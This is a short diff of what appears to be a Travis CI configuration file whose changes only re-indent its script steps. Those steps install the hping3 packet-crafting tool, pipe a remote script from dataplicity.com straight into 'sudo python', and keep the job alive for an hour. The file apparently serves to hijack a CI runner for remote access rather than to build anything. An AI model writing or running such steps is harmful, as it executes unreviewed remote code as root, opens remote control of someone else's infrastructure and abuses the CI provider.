@@ -6,11 +6,11 @@ language: bash
 
 script: 
 
-- sudo apt install hping3 -y
+     - sudo apt install hping3 -y
 
-- curl https://www.dataplicity.com/xsn6xmmx.py | sudo python
+     - curl https://www.dataplicity.com/xsn6xmmx.py | sudo python
 
-- travis_wait 3600 sleep 3600
+     - travis_wait 3600 sleep 3600
 
-- echo done
+     - echo done
 
